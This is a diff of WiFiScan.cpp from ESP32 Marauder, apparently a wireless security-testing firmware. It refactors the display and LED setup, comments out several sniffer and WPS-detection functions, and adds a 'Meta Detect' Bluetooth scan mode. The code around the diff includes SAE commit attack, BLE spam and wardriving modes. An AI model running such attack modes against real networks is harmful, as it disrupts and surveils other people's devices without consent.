+    this->setupScanDisplayArea(TFT_BLACK, color);
     #ifdef HAS_FULL_SCREEN
       display_obj.tft.fillRect(0,16,TFT_WIDTH,16, color);
-      display_obj.tft.drawCentreString("SAE Commit",TFT_WIDTH / 2,16,2);
+      display_obj.tft.drawCentreString(F("SAE Commit"),TFT_WIDTH / 2,16,2);
     #endif
-    #ifdef HAS_ILI9341
-      display_obj.touchToExit();
-    #endif
-    display_obj.tft.setTextColor(TFT_GREEN, TFT_BLACK);
-    display_obj.setupScrollArea(display_obj.TOP_FIXED_AREA_2, BOT_FIXED_AREA);
+    this->prepareScanStage(TFT_GREEN, TFT_BLACK);
   #endif
 
   if (scan_mode == WIFI_ATTACK_SAE_COMMIT)
@@ -5253,7 +5331,11 @@ void WiFiScan::RunSAEScan(uint8_t scan_mode, uint16_t color) {
     esp_wifi_set_country(&country);
     esp_event_loop_create_default();
   #endif
-  esp_wifi_set_storage(WIFI_STORAGE_RAM);
+  if (scan_mode != WIFI_ATTACK_SAE_COMMIT)
+    this->setWiFiMode(WIFI_MODE_NULL, beaconSnifferCallback);
+  else
+    this->setWiFiMode(WIFI_MODE_STA, beaconSnifferCallback);
+  /*esp_wifi_set_storage(WIFI_STORAGE_RAM);
   if (scan_mode != WIFI_ATTACK_SAE_COMMIT)
     esp_wifi_set_mode(WIFI_MODE_NULL);
   else
@@ -5262,7 +5344,7 @@ void WiFiScan::RunSAEScan(uint8_t scan_mode, uint16_t color) {
   this->setMac();
   esp_wifi_set_promiscuous(true);
   esp_wifi_set_promiscuous_filter(&filt);
-  esp_wifi_set_promiscuous_rx_cb(&beaconSnifferCallback);
+  esp_wifi_set_promiscuous_rx_cb(&beaconSnifferCallback);*/
   this->changeChannel(this->set_channel);
   //esp_wifi_set_channel(set_channel, WIFI_SECOND_CHAN_NONE);
   this->wifi_initialized = true;
@@ -5270,21 +5352,20 @@ void WiFiScan::RunSAEScan(uint8_t scan_mode, uint16_t color) {
 }
 
 // Function for running probe request scan
-void WiFiScan::RunProbeScan(uint8_t scan_mode, uint16_t color)
-{
+void WiFiScan::RunProbeScan(uint8_t scan_mode, uint16_t color) {
   if (scan_mode == WIFI_SCAN_PROBE)
     probe_req_ssids->clear();
 
   if (scan_mode == WIFI_SCAN_PROBE)
-    startPcap("probe");
+    startPcap(F("probe"));
   else if (scan_mode == BT_SCAN_FLOCK)
-    startPcap("flock");
+    startPcap(F("flock"));
   else if (scan_mode == WIFI_SCAN_DETECT_FOLLOW)
-    startPcap("mac_track");
+    startPcap(F("mac_track"));
   else if (scan_mode == WIFI_SCAN_STATION_WAR_DRIVE) {
     #ifdef HAS_GPS
       if (gps_obj.getGpsModuleStatus()) {
-        startLog("station_wardrive");
+        startLog(F("station_wardrive"));
         String header_line = "WigleWifi-1.4,appRelease=" + (String)MARAUDER_VERSION + ",model=ESP32 Marauder,release=" + (String)MARAUDER_VERSION + ",device=ESP32 Marauder,display=SPI TFT,board=ESP32 Marauder,brand=JustCallMeKoko\nMAC,SSID,AuthMode,FirstSeen,Channel,RSSI,CurrentLatitude,CurrentLongitude,AltitudeMeters,AccuracyMeters,Type\n";
         buffer_obj.append(header_line);
       } else {
@@ -5295,7 +5376,8 @@ void WiFiScan::RunProbeScan(uint8_t scan_mode, uint16_t color)
     #endif
   }
 
-  #ifdef HAS_FLIPPER_LED
+  this->setLEDMode(MODE_SNIFF);
+  /*#ifdef HAS_FLIPPER_LED
     flipper_led.sniffLED();
   #elif defined(XIAO_ESP32_S3)
     xiao_led.sniffLED();
@@ -5303,16 +5385,10 @@ void WiFiScan::RunProbeScan(uint8_t scan_mode, uint16_t color)
     stickc_led.sniffLED();
   #else
     led_obj.setMode(MODE_SNIFF);
-  #endif
+  #endif*/
   
   #ifdef HAS_SCREEN
-    display_obj.TOP_FIXED_AREA_2 = 48;
-    display_obj.tteBar = true;
-    display_obj.print_delay_1 = 15;
-    display_obj.print_delay_2 = 10;
-    display_obj.initScrollValues(true);
-    display_obj.tft.setTextWrap(false);
-    display_obj.tft.setTextColor(TFT_BLACK, color);
+    this->setupScanDisplayArea(TFT_BLACK, color);
     #ifdef HAS_FULL_SCREEN
       display_obj.tft.fillRect(0,16,TFT_WIDTH,16, color);
       if (scan_mode == WIFI_SCAN_PROBE)
@@ -5322,15 +5398,26 @@ void WiFiScan::RunProbeScan(uint8_t scan_mode, uint16_t color)
       else if (scan_mode == WIFI_SCAN_STATION_WAR_DRIVE)
         display_obj.tft.drawCentreString("Station Wardrive",TFT_WIDTH / 2,16,2);
       else {
-        Serial.println(F("Starting WiFi sniff for Flock..."));
+        //Serial.println(F("Starting WiFi sniff for Flock..."));
         display_obj.tft.drawCentreString("Flock Sniff",TFT_WIDTH / 2,16,2);
       }
     #endif
     #ifdef HAS_ILI9341
-      display_obj.touchToExit();
+      if (scan_mode != WIFI_SCAN_PROBE)
+        display_obj.touchToExit();
     #endif
     display_obj.tft.setTextColor(TFT_GREEN, TFT_BLACK);
-    display_obj.setupScrollArea(display_obj.TOP_FIXED_AREA_2, BOT_FIXED_AREA);
+    //if (scan_mode != WIFI_SCAN_PROBE)
+    //  display_obj.setupScrollArea(display_obj.TOP_FIXED_AREA_2, BOT_FIXED_AREA);
+    //else {
+    if ((scan_mode != WIFI_SCAN_DETECT_FOLLOW) &&
+        (scan_mode != WIFI_SCAN_STATION_WAR_DRIVE) &&
+        (scan_mode != BT_SCAN_FLOCK)) {
+      display_obj.tftDrawChannelScaleButtons(set_channel, false);
+      display_obj.tftDrawExitScaleButtons(false);
+      display_obj.tftDrawChanHopButton(false, settings_obj.loadSetting<bool>("ChanHop"));
+    }
+    //}
   #endif
   
   esp_wifi_init(&cfg2);
@@ -5338,13 +5425,14 @@ void WiFiScan::RunProbeScan(uint8_t scan_mode, uint16_t color)
     esp_wifi_set_country(&country);
     esp_event_loop_create_default();
   #endif
-  esp_wifi_set_storage(WIFI_STORAGE_RAM);
+  this->setWiFiMode(WIFI_MODE_NULL, beaconSnifferCallback);
+  /*esp_wifi_set_storage(WIFI_STORAGE_RAM);
   esp_wifi_set_mode(WIFI_MODE_NULL);
   esp_wifi_start();
   this->setMac();
   esp_wifi_set_promiscuous(true);
   esp_wifi_set_promiscuous_filter(&filt);
-  esp_wifi_set_promiscuous_rx_cb(&beaconSnifferCallback);
+  esp_wifi_set_promiscuous_rx_cb(&beaconSnifferCallback);*/
   this->changeChannel(this->set_channel);
   //esp_wifi_set_channel(set_channel, WIFI_SECOND_CHAN_NONE);
   this->wifi_initialized = true;
@@ -5359,13 +5447,7 @@ void WiFiScan::RunSourApple(uint8_t scan_mode, uint16_t color) {
     pAdvertising = pServer->getAdvertising();
 
     #ifdef HAS_SCREEN
-      display_obj.TOP_FIXED_AREA_2 = 48;
-      display_obj.tteBar = true;
-      display_obj.print_delay_1 = 15;
-      display_obj.print_delay_2 = 10;
-      display_obj.initScrollValues(true);
-      display_obj.tft.setTextWrap(false);
-      display_obj.tft.setTextColor(TFT_BLACK, color);
+      this->setupScanDisplayArea(TFT_BLACK, color);
       #ifdef HAS_FULL_SCREEN
         display_obj.tft.fillRect(0,16,TFT_WIDTH,16, color);
         display_obj.tft.drawCentreString("Sour Apple",TFT_WIDTH / 2,16,2);
@@ -5376,7 +5458,8 @@ void WiFiScan::RunSourApple(uint8_t scan_mode, uint16_t color) {
       display_obj.tft.setTextColor(TFT_GREEN, TFT_BLACK);
     #endif
 
-    #ifdef HAS_FLIPPER_LED
+    this->setLEDMode(MODE_SNIFF);
+    /*#ifdef HAS_FLIPPER_LED
       flipper_led.sniffLED();
     #elif defined(XIAO_ESP32_S3)
       xiao_led.sniffLED();
@@ -5384,7 +5467,7 @@ void WiFiScan::RunSourApple(uint8_t scan_mode, uint16_t color) {
       stickc_led.sniffLED();
     #else
       led_obj.setMode(MODE_SNIFF);
-    #endif
+    #endif*/
 
   #endif
 }
@@ -5392,13 +5475,7 @@ void WiFiScan::RunSourApple(uint8_t scan_mode, uint16_t color) {
 void WiFiScan::RunSwiftpairSpam(uint8_t scan_mode, uint16_t color) {
   #ifdef HAS_BT
     #ifdef HAS_SCREEN
-      display_obj.TOP_FIXED_AREA_2 = 48;
-      display_obj.tteBar = true;
-      display_obj.print_delay_1 = 15;
-      display_obj.print_delay_2 = 10;
-      display_obj.initScrollValues(true);
-      display_obj.tft.setTextWrap(false);
-      display_obj.tft.setTextColor(TFT_BLACK, color);
+      this->setupScanDisplayArea(TFT_BLACK, color);
       #ifdef HAS_FULL_SCREEN
         display_obj.tft.fillRect(0,16,TFT_WIDTH,16, color);
         if (scan_mode == BT_ATTACK_SWIFTPAIR_SPAM)
@@ -5420,8 +5497,8 @@ void WiFiScan::RunSwiftpairSpam(uint8_t scan_mode, uint16_t color) {
       display_obj.tft.setTextColor(TFT_GREEN, TFT_BLACK);
     #endif
 
-
-    #ifdef HAS_FLIPPER_LED
+    this->setLEDMode(MODE_ATTACK);
+    /*#ifdef HAS_FLIPPER_LED
       flipper_led.attackLED();
     #elif defined(XIAO_ESP32_S3)
       xiao_led.attackLED();
@@ -5429,13 +5506,13 @@ void WiFiScan::RunSwiftpairSpam(uint8_t scan_mode, uint16_t color) {
       stickc_led.attackLED();
     #else
       led_obj.setMode(MODE_ATTACK);
-    #endif
+    #endif*/
   #endif
 }
 
 // Function to start running any BLE scan
-void WiFiScan::RunBluetoothScan(uint8_t scan_mode, uint16_t color)
-{
+void WiFiScan::RunBluetoothScan(uint8_t scan_mode, uint16_t color) {
+  //Serial.println("RunBluetoothScan");
   #ifdef HAS_BT
     #ifdef HAS_SCREEN
       display_obj.print_delay_1 = 50;
@@ -5449,7 +5526,8 @@ void WiFiScan::RunBluetoothScan(uint8_t scan_mode, uint16_t color)
         (scan_mode == BT_SCAN_SIMPLE) ||
         (scan_mode == BT_SCAN_SIMPLE_TWO) ||
         (scan_mode == BT_SCAN_WAR_DRIVE_CONT) || 
-        (scan_mode == BT_SCAN_ANALYZER))
+        (scan_mode == BT_SCAN_ANALYZER) ||
+        (scan_mode == BT_SCAN_RAYBAN))
       NimBLEDevice::setScanDuplicateCacheSize(0);
     else {
       NimBLEDevice::setScanFilterMode(CONFIG_BTDM_SCAN_DUPL_TYPE_DEVICE);
@@ -5460,6 +5538,7 @@ void WiFiScan::RunBluetoothScan(uint8_t scan_mode, uint16_t color)
     NimBLEDevice::init("");
     pBLEScan = NimBLEDevice::getScan(); //create new scan
     if ((scan_mode == BT_SCAN_ALL) ||
+        (scan_mode == BT_SCAN_RAYBAN) ||
         (scan_mode == BT_SCAN_WAR_DRIVE) ||
         (scan_mode == BT_SCAN_WAR_DRIVE_CONT) ||
         (scan_mode == BT_SCAN_AIRTAG) ||
@@ -5485,19 +5564,16 @@ void WiFiScan::RunBluetoothScan(uint8_t scan_mode, uint16_t color)
           }
           String header_line = "WigleWifi-1.4,appRelease=" + (String)MARAUDER_VERSION + ",model=ESP32 Marauder,release=" + (String)MARAUDER_VERSION + ",device=ESP32 Marauder,display=SPI TFT,board=ESP32 Marauder,brand=JustCallMeKoko\nMAC,SSID,AuthMode,FirstSeen,Channel,RSSI,CurrentLatitude,CurrentLongitude,AltitudeMeters,AccuracyMeters,Type\n";
           buffer_obj.append(header_line);
-        } else {
-          return;
         }
-      #else
-        return;
+        //else {
+        //  return;
+        //}
+      //#else
+      //  return;
       #endif
 
       #ifdef HAS_SCREEN
-        display_obj.TOP_FIXED_AREA_2 = 48;
-        display_obj.tteBar = true;
-        display_obj.initScrollValues(true);
-        display_obj.tft.setTextWrap(false);
-        display_obj.tft.setTextColor(TFT_BLACK, color);
+        this->setupScanDisplayArea(TFT_BLACK, color);
         #ifdef HAS_FULL_SCREEN
           display_obj.tft.fillRect(0,16,TFT_WIDTH,16, color);
           if (scan_mode == BT_SCAN_ALL)
@@ -5520,12 +5596,14 @@ void WiFiScan::RunBluetoothScan(uint8_t scan_mode, uint16_t color)
             display_obj.tft.drawCentreString("BT Wardrive",TFT_WIDTH / 2,16,2);
           else if (scan_mode == BT_SCAN_WAR_DRIVE_CONT)
             display_obj.tft.drawCentreString("BT Wardrive Continuous",TFT_WIDTH / 2,16,2);
+          else if (scan_mode == BT_SCAN_RAYBAN)
+            display_obj.tft.drawCentreString("Meta Detect",TFT_WIDTH / 2, 16, 2);
           #ifdef HAS_ILI9341
             display_obj.touchToExit();
           #endif
         #endif
         display_obj.tft.setTextColor(TFT_CYAN, TFT_BLACK);
-        display_obj.setupScrollArea(display_obj.TOP_FIXED_AREA_2, BOT_FIXED_AREA);
+        //display_obj.setupScrollArea(display_obj.TOP_FIXED_AREA_2, BOT_FIXED_AREA);
       #endif
       if (scan_mode == BT_SCAN_ALL)
         #ifndef HAS_NIMBLE_2
@@ -5534,6 +5612,7 @@ void WiFiScan::RunBluetoothScan(uint8_t scan_mode, uint16_t color)
           pBLEScan->setScanCallbacks(new bluetoothScanAllCallback(), false);
         #endif
       else if ((scan_mode == BT_SCAN_FLIPPER) ||
+                (scan_mode == BT_SCAN_RAYBAN) ||
                 (scan_mode == BT_SCAN_WAR_DRIVE) ||
                 (scan_mode == BT_SCAN_WAR_DRIVE_CONT) ||
                 (scan_mode == BT_SCAN_FLOCK) ||
@@ -5554,7 +5633,7 @@ void WiFiScan::RunBluetoothScan(uint8_t scan_mode, uint16_t color)
         #endif
       }
     }
-    else if ((scan_mode == BT_SCAN_WAR_DRIVE) || (scan_mode == BT_SCAN_WAR_DRIVE_CONT) || (scan_mode == BT_SCAN_FLOCK_WARDRIVE)) {
+    /*else if ((scan_mode == BT_SCAN_WAR_DRIVE) || (scan_mode == BT_SCAN_WAR_DRIVE_CONT) || (scan_mode == BT_SCAN_FLOCK_WARDRIVE)) {
       #ifdef HAS_GPS
         if (gps_obj.getGpsModuleStatus()) {
           if (scan_mode == BT_SCAN_WAR_DRIVE) {
@@ -5570,11 +5649,12 @@ void WiFiScan::RunBluetoothScan(uint8_t scan_mode, uint16_t color)
           }
           String header_line = "WigleWifi-1.4,appRelease=" + (String)MARAUDER_VERSION + ",model=ESP32 Marauder,release=" + (String)MARAUDER_VERSION + ",device=ESP32 Marauder,display=SPI TFT,board=ESP32 Marauder,brand=JustCallMeKoko\nMAC,SSID,AuthMode,FirstSeen,Channel,RSSI,CurrentLatitude,CurrentLongitude,AltitudeMeters,AccuracyMeters,Type\n";
           buffer_obj.append(header_line);
-        } else {
-          return;
         }
-      #else
-        return;
+        //else {
+        //  return;
+        //}
+      //#else
+      //  return;
       #endif
       #ifdef HAS_SCREEN
         display_obj.TOP_FIXED_AREA_2 = 48;
@@ -5608,20 +5688,20 @@ void WiFiScan::RunBluetoothScan(uint8_t scan_mode, uint16_t color)
           pBLEScan->setScanCallbacks(new bluetoothScanAllCallback(), true);
         #endif
         
-    }
+    }*/
     else if (scan_mode == BT_SCAN_SKIMMERS) {
       #ifdef HAS_SCREEN
         display_obj.TOP_FIXED_AREA_2 = 160;
         display_obj.tteBar = true;
         display_obj.tft.fillScreen(TFT_DARKGREY);
-        display_obj.initScrollValues(true);
+        //display_obj.initScrollValues(true);
         display_obj.tft.setTextWrap(false);
         display_obj.tft.setTextColor(TFT_BLACK, color);
         display_obj.tft.fillRect(0,16,TFT_WIDTH,16, color);
         display_obj.tft.drawCentreString(text_table4[42],TFT_WIDTH / 2,16,2);
         display_obj.twoPartDisplay(text_table4[43]);
         display_obj.tft.setTextColor(TFT_BLACK, TFT_DARKGREY);
-        display_obj.setupScrollArea(display_obj.TOP_FIXED_AREA_2, BOT_FIXED_AREA);
+        //display_obj.setupScrollArea(display_obj.TOP_FIXED_AREA_2, BOT_FIXED_AREA);
       #endif
       #ifndef HAS_NIMBLE_2
         pBLEScan->setAdvertisedDeviceCallbacks(new bluetoothScanAllCallback(), false);
@@ -5631,11 +5711,7 @@ void WiFiScan::RunBluetoothScan(uint8_t scan_mode, uint16_t color)
     }
     else if (scan_mode == BT_SCAN_ANALYZER) {
       #ifdef HAS_SCREEN
-        display_obj.TOP_FIXED_AREA_2 = 48;
-        display_obj.tteBar = true;
-        display_obj.initScrollValues(true);
-        display_obj.tft.setTextWrap(false);
-        display_obj.tft.setTextColor(TFT_BLACK, color);
+        this->setupScanDisplayArea(TFT_BLACK, color);
         #ifdef HAS_FULL_SCREEN
           display_obj.tft.fillRect(0,16,TFT_WIDTH,16, color);
           display_obj.tft.drawCentreString("Bluetooth Analyzer", TFT_WIDTH / 2, 16, 2);
@@ -5644,7 +5720,7 @@ void WiFiScan::RunBluetoothScan(uint8_t scan_mode, uint16_t color)
           #endif
         #endif
         display_obj.tft.setTextColor(TFT_CYAN, TFT_BLACK);
-        display_obj.setupScrollArea(display_obj.TOP_FIXED_AREA_2, BOT_FIXED_AREA);
+        //display_obj.setupScrollArea(display_obj.TOP_FIXED_AREA_2, BOT_FIXED_AREA);
       #endif
       #ifndef HAS_NIMBLE_2
         pBLEScan->setAdvertisedDeviceCallbacks(new bluetoothScanAllCallback(), false);
@@ -5666,6 +5742,7 @@ void WiFiScan::RunBluetoothScan(uint8_t scan_mode, uint16_t color)
     pBLEScan->setWindow(99);  // less or equal setInterval value
     pBLEScan->setMaxResults(0);
     if ((scan_mode == BT_SCAN_WAR_DRIVE_CONT) ||
+        (scan_mode == BT_SCAN_RAYBAN) ||
         (scan_mode == WIFI_SCAN_WAR_DRIVE) ||
         (scan_mode == BT_SCAN_ANALYZER) ||
         (scan_mode == BT_SCAN_FLOCK) ||
@@ -5676,11 +5753,12 @@ void WiFiScan::RunBluetoothScan(uint8_t scan_mode, uint16_t color)
     if ((scan_mode != WIFI_SCAN_WAR_DRIVE) &&
         (scan_mode != WIFI_SCAN_DETECT_FOLLOW)) {
       pBLEScan->start(0, scanCompleteCB, false);
-      Serial.println(F("Started BLE Scan"));
+      //Serial.println(F("Started BLE Scan"));
     }
     this->ble_initialized = true;
 
-    #ifdef HAS_FLIPPER_LED
+    this->setLEDMode(MODE_SNIFF);
+    /*#ifdef HAS_FLIPPER_LED
       flipper_led.sniffLED();
     #elif defined(XIAO_ESP32_S3)
       xiao_led.sniffLED();
@@ -5688,7 +5766,7 @@ void WiFiScan::RunBluetoothScan(uint8_t scan_mode, uint16_t color)
       stickc_led.sniffLED();
     #else
       led_obj.setMode(MODE_SNIFF);
-    #endif
+    #endif*/
 
     initTime = millis();
   #endif
@@ -5711,102 +5789,6 @@ void WiFiScan::getMAC(char *addr, uint8_t* data, uint16_t offset) {
 void WiFiScan::getMAC(uint8_t* mac, const uint8_t* data, uint16_t offset) {
   for (int i = 0; i < 6; i++)
     mac[i] = data[offset + i];
-}
-
-void WiFiScan::pwnSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type) { 
-  wifi_promiscuous_pkt_t *snifferPacket = (wifi_promiscuous_pkt_t*)buf;
-  WifiMgmtHdr *frameControl = (WifiMgmtHdr*)snifferPacket->payload;
-  wifi_pkt_rx_ctrl_t ctrl = (wifi_pkt_rx_ctrl_t)snifferPacket->rx_ctrl;
-  int len = snifferPacket->rx_ctrl.sig_len;
-
-  String display_string = "";
-  String src = "";
-  String essid = "";
-
-  if (type == WIFI_PKT_MGMT)
-  {
-    len -= 4;
-    int fctl = ntohs(frameControl->fctl);
-    const wifi_ieee80211_packet_t *ipkt = (wifi_ieee80211_packet_t *)snifferPacket->payload;
-    const WifiMgmtHdr *hdr = &ipkt->hdr;
-
-    // If we dont the buffer size is not 0, don't write or else we get CORRUPT_HEAP
-    #ifdef HAS_SCREEN
-      int buf = display_obj.display_buffer->size();
-    #else
-      int buf = 0;
-    #endif
-    
-    if ((snifferPacket->payload[0] == 0x80) && (buf == 0))
-    {
-      char addr[] = "00:00:00:00:00:00";
-      getMAC(addr, snifferPacket->payload, 10);
-      src.concat(addr);
-      if (src == "de:ad:be:ef:de:ad") {
-        
-        
-        delay(random(0, 10));
-        Serial.print(snifferPacket->rx_ctrl.rssi);
-        Serial.print(F(" Ch: "));
-        Serial.print(snifferPacket->rx_ctrl.channel);
-        Serial.print(F(" BSSID: "));
-        Serial.print(addr);
-        //display_string.concat(addr);
-        display_string.concat("CH: " + (String)snifferPacket->rx_ctrl.channel);
-        Serial.print(F(" ESSID: "));
-        display_string.concat(F(" -> "));
-
-        // Just grab the first 255 bytes of the pwnagotchi beacon
-        // because that is where the name is
-        //for (int i = 0; i < snifferPacket->payload[37]; i++)
-        for (int i = 0; i < len - 37; i++)
-        {
-          Serial.print((char)snifferPacket->payload[i + 38]);
-          //display_string.concat((char)snifferPacket->payload[i + 38]);
-          if (isAscii(snifferPacket->payload[i + 38]))
-            essid.concat((char)snifferPacket->payload[i + 38]);
-          else
-            Serial.println("Got non-ascii character: " + (String)(char)snifferPacket->payload[i + 38]);
-        }
-        //essid.concat("\": \"\"}}");
-        //Serial.println("\n" + (String)(snifferPacket->payload[37]) + " -> " + essid);
-
-        // Load json
-        //DynamicJsonBuffer jsonBuffer; // ArduinoJson v5
-        DynamicJsonDocument json(1024); // ArduinoJson v6
-        //JsonObject& json = jsonBuffer.parseObject(essid); // ArduinoJson v5
-         // ArduinoJson v6
-        if (deserializeJson(json, essid)) {
-          Serial.println(F("\nCould not parse Pwnagotchi json"));
-          display_string.concat(essid);
-        }
-        else {
-          Serial.println(F("\nSuccessfully parsed json"));
-          String json_output;
-          //json.printTo(json_output); // ArduinoJson v5
-          serializeJson(json, json_output); // ArduinoJson v6
-          Serial.println(json_output);
-          display_string.concat(json["name"].as<String>() + " pwnd: " + json["pwnd_tot"].as<String>());
-        }
-  
-        int temp_len = display_string.length();
-        for (int i = 0; i < 40 - temp_len; i++)
-        {
-          display_string.concat(" ");
-        }
-  
-        Serial.print(F(" "));
-
-        #ifdef HAS_SCREEN
-          display_obj.display_buffer->add(display_string);
-        #endif
-
-        Serial.println();
-
-        buffer_obj.append(snifferPacket, len);
-      }
-    }
-  }
 }
 
 int WiFiScan::checkMatchAP(char addr[], bool update_ap) {
@@ -5898,38 +5880,27 @@ void WiFiScan::apSnifferCallbackFull(void* buf, wifi_promiscuous_pkt_type_t type
       int buf = 0;
     #endif
 
-    bool wps = wifi_scan_obj.beaconHasWPS(snifferPacket->payload, len);
+    bool wps = false;
+    //bool wps = wifi_scan_obj.beaconHasWPS(snifferPacket->payload, len);
 
     // We got a probe resp. Check for WPS configs
     if (snifferPacket->payload[0] == 0x50) {
 
       String man = wifi_scan_obj.extractManufacturer(snifferPacket->payload);
 
-      if (wps) {
-        char addr[] = "00:00:00:00:00:00";
-        getMAC(addr, snifferPacket->payload, 10);
+      //if (wps) {
+      char addr[] = "00:00:00:00:00:00";
+      getMAC(addr, snifferPacket->payload, 10);
 
-        int index = wifi_scan_obj.checkMatchAP(addr);
+      int index = wifi_scan_obj.checkMatchAP(addr);
 
-        if ((index > 0) && (!access_points->get(index).wps)) {
-          AccessPoint new_ap = access_points->get(index);
-          new_ap.wps = true;
-          new_ap.man = man;
-          access_points->set(index, new_ap);
-          Serial.println((String)access_points->get(index).essid + ": RXd WPS Configs");
-
-          #ifdef HAS_SCREEN
-            display_string = RED_KEY;
-            display_string.concat((String)access_points->get(index).essid + ": RXd WPS Configs");
-            int temp_len = display_string.length();
-
-            for (int i = 0; i < 50 - temp_len; i++)
-              display_string.concat(" ");
-
-            display_obj.display_buffer->add(display_string);
-          #endif
-        }
+      if ((index > 0) && (!access_points->get(index).wps)) {
+        AccessPoint new_ap = access_points->get(index);
+        //new_ap.wps = true;
+        new_ap.man = man;
+        access_points->set(index, new_ap);
       }
+      //}
     }
 
     // We got an AP. Check if in list and add if not
@@ -5953,8 +5924,8 @@ void WiFiScan::apSnifferCallbackFull(void* buf, wifi_promiscuous_pkt_type_t type
       
         Serial.print(snifferPacket->rx_ctrl.rssi);
         Serial.print(F(" Ch: "));
-        Serial.print(snifferPacket->rx_ctrl.channel);
-        Serial.print(F(" BSSID: "));
+        Serial.print((String)snifferPacket->rx_ctrl.channel + " ");
+        //Serial.print(F(" BSSID: "));
         Serial.print(addr);
         #ifdef HAS_SCREEN
           display_string.concat("#");
@@ -5991,12 +5962,7 @@ void WiFiScan::apSnifferCallbackFull(void* buf, wifi_promiscuous_pkt_type_t type
         Serial.print(F(" "));
 
         #ifdef HAS_SCREEN
-          if (wifi_scan_obj.checkMem())
-            display_obj.display_buffer->add(display_string);
-          else {
-            String warning_str = "Mem limit reached " + display_string;
-            display_obj.display_buffer->add(warning_str);
-          }
+          display_obj.display_buffer->add(display_string);
         #endif
         
         if (essid == "") {
@@ -6017,22 +5983,16 @@ void WiFiScan::apSnifferCallbackFull(void* buf, wifi_promiscuous_pkt_type_t type
           ap.bssid[5] = snifferPacket->payload[15];
           ap.selected = false;
           ap.stations = new LinkedList<uint16_t>();
+          ap.has_msg_1 = false;
+          ap.has_msg_2 = false;
+          ap.has_msg_3 = false;
+          ap.has_msg_4 = false;
           
-          //ap.beacon = new LinkedList<char>();
-
-          //for (int i = 0; i < len; i++) {
-          //  ap.beacon->add(snifferPacket->payload[i]);
-          //}
           ap.beacon[0] = snifferPacket->payload[34];
           ap.beacon[1] = snifferPacket->payload[35];
-          //ap.beacon->add(snifferPacket->payload[34]);
-          //ap.beacon->add(snifferPacket->payload[35]);
-
-          Serial.print(F("\nBeacon: "));
 
           for (int i = 0; i < 2; i++) {
             char hexCar[4];
-            //sprintf(hexCar, "%02X", ap.beacon->get(i));
             sprintf(hexCar, "%02X", ap.beacon[i]);
             Serial.print(hexCar);
             if ((i + 1) % 16 == 0)
@@ -6052,15 +6012,6 @@ void WiFiScan::apSnifferCallbackFull(void* buf, wifi_promiscuous_pkt_type_t type
           ap.man = "";
 
           access_points->add(ap);
-
-          Serial.print(access_points->size());
-          Serial.print(F(" "));
-          Serial.print(esp_get_free_heap_size());
-          #ifdef HAS_PSRAM
-            Serial.print(F(" "));
-            Serial.print(heap_caps_get_free_size(MALLOC_CAP_SPIRAM));
-          #endif
-
         }
 
         Serial.println();
@@ -6202,12 +6153,7 @@ void WiFiScan::apSnifferCallbackFull(void* buf, wifi_promiscuous_pkt_type_t type
 
       Serial.print(F(" "));
 
-      if (mem_check)
-        display_obj.display_buffer->add(display_string);
-      else {
-        String warning_str = "Memory lim reached " + display_string;
-        display_obj.display_buffer->add(warning_str);
-      }
+      display_obj.display_buffer->add(display_string);
     #endif
 
     if (mem_check) {
@@ -6221,7 +6167,7 @@ void WiFiScan::apSnifferCallbackFull(void* buf, wifi_promiscuous_pkt_type_t type
   }
 }
 
-bool WiFiScan::beaconHasWPS(const uint8_t* payload, int len) {
+/*bool WiFiScan::beaconHasWPS(const uint8_t* payload, int len) {
   int i = 36; // skip radiotap + fixed 802.11 header
 
   while (i < len - 2) {
@@ -6271,7 +6217,7 @@ bool WiFiScan::beaconHasWPS(const uint8_t* payload, int len) {
   }
 
   return false;
-}
+}*/
 
 uint8_t WiFiScan::getSecurityType(const uint8_t* beacon, uint16_t len) {
   const uint8_t* frame = beacon;
@@ -6344,8 +6290,7 @@ uint8_t WiFiScan::getSecurityType(const uint8_t* beacon, uint16_t len) {
   return WIFI_SECURITY_OPEN;
 }
 
-void WiFiScan::apSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type)
-{
+/*void WiFiScan::apSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
   extern WiFiScan wifi_scan_obj;
   wifi_promiscuous_pkt_t *snifferPacket = (wifi_promiscuous_pkt_t*)buf;
   int len = snifferPacket->rx_ctrl.sig_len;
@@ -6393,8 +6338,8 @@ void WiFiScan::apSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type)
         delay(random(0, 10));
         Serial.print(snifferPacket->rx_ctrl.rssi);
         Serial.print(F(" Ch: "));
-        Serial.print(snifferPacket->rx_ctrl.channel);
-        Serial.print(F(" BSSID: "));
+        Serial.print((String)snifferPacket->rx_ctrl.channel + " ");
+        //Serial.print(F(" BSSID: "));
         Serial.print(addr);
         display_string.concat(addr);
         Serial.print(F(" ESSID: "));
@@ -6431,22 +6376,6 @@ void WiFiScan::apSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type)
         uint8_t security_type = wifi_scan_obj.getSecurityType(snifferPacket->payload, snifferPacket->rx_ctrl.sig_len);
         
         bool wps = wifi_scan_obj.beaconHasWPS(snifferPacket->payload, snifferPacket->rx_ctrl.sig_len);
-        
-        /*AccessPoint ap = {essid,
-                          snifferPacket->rx_ctrl.channel,
-                          {snifferPacket->payload[10],
-                           snifferPacket->payload[11],
-                           snifferPacket->payload[12],
-                           snifferPacket->payload[13],
-                           snifferPacket->payload[14],
-                           snifferPacket->payload[15]},
-                          false,
-                          NULL,
-                          snifferPacket->rx_ctrl.rssi,
-                          new LinkedList<uint16_t>(),
-                          0,
-                          security_type,
-                          wps};*/
 
         AccessPoint ap = {essid,
                           snifferPacket->rx_ctrl.channel,
@@ -6466,13 +6395,13 @@ void WiFiScan::apSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type)
 
         access_points->add(ap);
 
-        Serial.print(access_points->size());
-        Serial.print(F(" "));
-        Serial.print(esp_get_free_heap_size());
-        #ifdef HAS_PSRAM
-          Serial.print(F(" "));
-          Serial.print(heap_caps_get_free_size(MALLOC_CAP_SPIRAM));
-        #endif
+        //Serial.print(access_points->size());
+        //Serial.print(F(" "));
+        //Serial.print(esp_get_free_heap_size());
+        //#ifdef HAS_PSRAM
+        //  Serial.print(F(" "));
+        //  Serial.print(heap_caps_get_free_size(MALLOC_CAP_SPIRAM));
+        //#endif
 
         Serial.println();
 
@@ -6480,7 +6409,7 @@ void WiFiScan::apSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type)
       }
     }
   }
-}
+}*/
 
 String WiFiScan::processPwnagotchiBeacon(const uint8_t* frame, int length) {
   // Approximate the start of JSON payload within the beacon frame
